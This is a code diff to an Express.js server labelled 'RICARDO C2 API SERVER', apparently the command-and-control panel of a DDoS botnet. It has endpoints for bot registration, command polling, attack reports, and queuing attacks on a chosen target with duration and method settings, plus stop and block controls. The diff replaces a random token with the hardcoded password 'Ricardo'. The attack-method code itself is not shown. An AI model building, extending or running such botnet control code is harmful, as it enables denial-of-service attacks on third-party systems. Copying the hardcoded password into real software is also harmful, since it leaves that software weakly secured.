@@ -8,7 +8,7 @@ const app = express();
 app.use(express.json());
 
 const port = process.env.PORT || 5553;
-const AUTH_TOKEN = process.env.AUTH_TOKEN || crypto.randomBytes(32).toString('hex');
+const PASSWORD = process.env.PASSWORD || 'Ricardo'; // Simple password instead of token
 
 // Rate limiting
 const limiter = rateLimit({
@@ -17,12 +17,15 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
-// Auth middleware
+// Password authentication middleware
 const authenticate = (req, res, next) => {
-  const token = req.headers['authorization'] || req.query.token;
-  if (token !== AUTH_TOKEN) {
-    return res.status(401).json({ error: 'Unauthorized' });
+  // Check password in headers, query params, or body
+  const password = req.headers['x-password'] || req.query.password || req.body?.password;
+  
+  if (password !== PASSWORD) {
+    return res.status(401).json({ error: 'Unauthorized - Invalid password' });
   }
+  
   next();
 };
 
@@ -142,7 +145,7 @@ const methodFiles = {
 
 // ========== API ENDPOINTS ==========
 
-// Bot registration
+// Bot registration (no password needed for bots)
 app.post('/register', (req, res) => {
   const { url } = req.body;
   if (!url) return res.status(400).json({ error: 'Bot URL required' });
@@ -173,7 +176,7 @@ app.post('/register', (req, res) => {
   res.json({ message: 'Bot registered successfully', approved: true, bot: newBot });
 });
 
-// Command polling
+// Command polling (no password needed for bots)
 app.get('/get-command', (req, res) => {
   const { botUrl } = req.query;
   if (!botUrl) return res.status(400).json({ error: 'Bot URL required' });
@@ -195,7 +198,7 @@ app.get('/get-command', (req, res) => {
   res.json({ hasCommand: false });
 });
 
-// Attack report
+// Attack report (password protected)
 app.post('/api/report', authenticate, (req, res) => {
   const { botUrl, target, method, requests } = req.body;
   
@@ -212,17 +215,17 @@ app.post('/api/report', authenticate, (req, res) => {
   res.json({ success: true });
 });
 
-// Get all bots
+// Get all bots (password protected)
 app.get('/bots', authenticate, (req, res) => {
   res.json({ bots: connectedBots });
 });
 
-// Get blocked bots
+// Get blocked bots (password protected)
 app.get('/blocked', authenticate, (req, res) => {
   res.json({ blocked: Array.from(blockedBots) });
 });
 
-// Get live stats
+// Get live stats (password protected)
 app.get('/api/stats', authenticate, (req, res) => {
   const now = Date.now();
   const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
@@ -237,7 +240,7 @@ app.get('/api/stats', authenticate, (req, res) => {
   res.json(botStats);
 });
 
-// Health check
+// Health check (no password needed)
 app.get('/ping', (req, res) => {
   res.json({ 
     alive: true, 
@@ -247,7 +250,7 @@ app.get('/ping', (req, res) => {
   });
 });
 
-// Attack a specific bot
+// Attack a specific bot (password protected)
 app.get('/attack-bot', authenticate, (req, res) => {
   const { bot, target, time, methods } = req.query;
   if (!bot || !target || !time || !methods) {
@@ -268,7 +271,7 @@ app.get('/attack-bot', authenticate, (req, res) => {
   res.json({ success: true, message: 'Command queued' });
 });
 
-// Stop a specific bot
+// Stop a specific bot (password protected)
 app.get('/stop-bot', authenticate, (req, res) => {
   const { bot } = req.query;
   if (!bot) return res.json({ success: false, error: 'Bot URL required' });
@@ -278,7 +281,7 @@ app.get('/stop-bot', authenticate, (req, res) => {
   res.json({ success: true, message: 'Stop command queued' });
 });
 
-// Stop all bots
+// Stop all bots (password protected)
 app.get('/stop-all', authenticate, (req, res) => {
   pendingCommands = {};
   connectedBots.forEach(bot => stopCommands.add(bot.url));
@@ -286,7 +289,7 @@ app.get('/stop-all', authenticate, (req, res) => {
   res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
 });
 
-// Block a bot
+// Block a bot (password protected)
 app.get('/block-bot', authenticate, (req, res) => {
   const { bot } = req.query;
   if (!bot) return res.json({ success: false, error: 'Bot URL required' });
@@ -300,7 +303,7 @@ app.get('/block-bot', authenticate, (req, res) => {
   res.json({ success: true, message: 'Bot blocked' });
 });
 
-// Unblock a bot
+// Unblock a bot (password protected)
 app.get('/unblock-bot', authenticate, (req, res) => {
   const { bot } = req.query;
   if (!bot) return res.json({ success: false, error: 'Bot URL required' });
@@ -309,7 +312,7 @@ app.get('/unblock-bot', authenticate, (req, res) => {
   res.json({ success: true, message: 'Bot unblocked' });
 });
 
-// Server-side attack
+// Server-side attack (password protected)
 app.get('/attack', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
   if (!target || !time || !methods) {
@@ -397,18 +400,20 @@ app.listen(port, () => {
   console.log('🚀 RICARDO C2 API SERVER');
   console.log('========================================');
   console.log(`📍 Port:      ${port}`);
-  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
+  console.log(`🔑 Password:   ${PASSWORD} (for authentication)`);
   console.log(`📊 API Endpoints:`);
-  console.log(`   POST /register - Bot registration`);
-  console.log(`   GET  /get-command - Command polling`);
-  console.log(`   GET  /bots - List bots (auth)`);
-  console.log(`   GET  /api/stats - Live stats (auth)`);
-  console.log(`   GET  /attack - Server attack (auth)`);
-  console.log(`   GET  /attack-bot - Attack specific bot (auth)`);
-  console.log(`   GET  /stop-all - Stop all attacks (auth)`);
-  console.log(`   GET  /block-bot - Block bot (auth)`);
-  console.log(`   GET  /unblock-bot - Unblock bot (auth)`);
-  console.log(`   GET  /ping - Health check`);
+  console.log(`   POST /register - Bot registration (no auth)`);
+  console.log(`   GET  /get-command - Command polling (no auth)`);
+  console.log(`   GET  /ping - Health check (no auth)`);
+  console.log(`   ------------------------------`);
+  console.log(`   GET  /bots - List bots (password required)`);
+  console.log(`   GET  /api/stats - Live stats (password required)`);
+  console.log(`   GET  /attack - Server attack (password required)`);
+  console.log(`   GET  /attack-bot - Attack specific bot (password required)`);
+  console.log(`   GET  /stop-all - Stop all attacks (password required)`);
+  console.log(`   GET  /block-bot - Block bot (password required)`);
+  console.log(`   GET  /unblock-bot - Unblock bot (password required)`);
+  console.log(`   POST /api/report - Attack report (password required)`);
   console.log('========================================\n');
   
   // Create directories
